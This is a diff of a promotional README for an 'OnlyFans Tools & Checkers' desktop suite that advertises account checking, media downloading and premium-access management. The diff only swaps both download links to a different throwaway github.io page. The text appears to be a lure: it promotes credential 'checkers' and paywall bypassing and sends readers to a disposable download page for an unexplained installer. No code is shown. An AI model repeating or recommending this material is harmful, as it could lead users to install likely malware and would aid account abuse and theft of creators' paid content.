@@ -2,7 +2,7 @@
 
 Welcome to the OnlyFans Tools & Checkers suite, your comprehensive solution for managing OnlyFans accounts in 2026. This advanced Windows desktop application is designed to streamline account checking, content downloading, and premium access management with a user-friendly interface. Whether you're verifying account details, extracting media for offline use, or optimizing your subscription workflow, this suite provides powerful tools to enhance your experience.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -58,7 +58,7 @@ While the full suite is a premium offering, you can access a limited demo versio
 
 Get started with the OnlyFans Tools Suite 2026 by downloading the latest version from our official GitHub page. The download includes all necessary files and updates for a seamless installation.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 
